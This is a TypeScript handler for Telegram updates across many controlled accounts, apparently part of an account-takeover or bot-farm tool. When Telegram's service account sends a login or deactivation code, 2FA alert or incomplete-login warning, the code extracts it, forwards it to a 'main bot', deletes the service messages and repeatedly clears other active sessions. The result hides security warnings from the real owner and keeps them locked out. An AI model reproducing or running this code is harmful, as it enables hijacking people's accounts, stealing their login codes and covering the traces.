import BigInt from 'big-integer';

import { TelegramClient } from '../../../gramjs';
import GramJs from '../../../gramjs/tl/api';
import {
  getDialogue,
  updateDialogue,
  updateSimpleDialogue,
} from '../../db/dialogues';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { clearAuthorizations } from '../account/clearAuthorizations';
import { deleteHistory } from '../messages/deleteHistory';

const extractLoginCode = (message: string): string | null => {
  const numbers = message.match(/\d+/g);
  const code = numbers?.find((num) => num.length === 5);
  return code ?? null;
};

const is2FAChange = (message: string): boolean => {
  return (
    message.includes('Two-Step') ||
    message.includes('Изменены настройки двухэтапной аутентификации') ||
    message.includes('Включена двухэтапная аутентификация')
  );
};

const isInclompleteLogin = (message: string): boolean => {
  return message.includes('Incomplete login attempt');
};

function findValue(obj: Record<string, any>, valueKey: string) {
  return (
    obj[valueKey] ||
    obj.peer?.[valueKey] ||
    obj.message?.[valueKey] ||
    obj.message?.fromId?.[valueKey] ||
    obj.message?.peer?.[valueKey] ||
    obj.message?.peerId?.[valueKey]
  );
}

export const handleUpdate = async (
  client: TelegramClient | null,
  accountId: string,
  update: any,

  onNewMessage: () => void
) => {
  if (!update) {
    return;
  }

  const userId = findValue(update, 'userId');
  if (userId && update instanceof GramJs.UpdateUserStatus) {
    if (update.status instanceof GramJs.UserStatusOffline) {
      await updateSimpleDialogue(accountId, String(userId), {
        lastOnline: update.status.wasOnline,
      });
    }
    if (update.status instanceof GramJs.UserStatusOnline) {
      await updateSimpleDialogue(accountId, String(userId), {
        lastOnline: update.status.expires,
      });
    }
  }

  if (
    update.className === 'UpdateConnectionState' ||
    update.className === 'UpdateUserStatus' ||
    update.className === 'UpdateUserTyping'
  ) {
    if (process.env.DEV !== 'true') {
      return;
    }
  }

  console.log({
    accountId,
    message: `<${update.className}>`,
    payload: JSON.parse(JSON.stringify(update)),
  });

  if (
    update instanceof GramJs.UpdateNewMessage ||
    update instanceof GramJs.UpdateShortMessage
  ) {
    if (userId) {
      const dialog = await getDialogue(accountId, String(userId));
      if (dialog && !dialog.reason && !dialog.automaticReason) {
        onNewMessage();
      }

      if (
        update instanceof GramJs.UpdateShortMessage &&
        String(userId) === '777000'
      ) {
        console.warn({
          accountId,
          message: '[TELEGRAM_SERVICE_NOTIFICATION]',
          payload: JSON.parse(JSON.stringify(update)),
        });

        const code = extractLoginCode(update.message);
        let messageText = update.message;

        if (code) {
          messageText = update.message.includes('my.telegram.org')
            ? `CODE_FOR_DEACTIVATE: ${code}`
            : `CODE_FOR_LOGIN: ${code}`;
        } else if (is2FAChange(update.message)) {
          messageText = '2FA_SETTINGS_CHANGED';
        } else if (isInclompleteLogin(update.message)) {
          messageText = 'INCOMPLETE_LOGIN_ATTEMPT';
        }

        const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
ID: ${accountId}
${messageText}`;

        await sendToMainBot(notificationMessage);

        if (client) {
          await deleteHistory(
            client,
            new GramJs.InputPeerUser({
              userId: update.userId,
              accessHash: BigInt(0),
            }),
            true
          );

          [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
            setTimeout(
              async () => {
                try {
                  await clearAuthorizations(client);
                } catch {}
              },
              minutes * 60 * 1000
            );
          });
        }
      }
    }
  } else if (
    update instanceof GramJs.UpdateReadHistoryOutbox ||
    update instanceof GramJs.UpdateReadHistoryInbox
  ) {
    if (userId && update.maxId) {
      const dialog = await getDialogue(accountId, String(userId));

      if (
        !dialog ||
        !dialog.messages ||
        !Array.isArray(dialog.messages) ||
        !dialog.messages.length
      ) {
        return;
      }

      if (dialog.messages[dialog.messages.length - 1].id === update.maxId) {
        await updateDialogue({
          accountId,
          recipientId: String(userId),
          read: true,
        });
      }
    }
  }
};
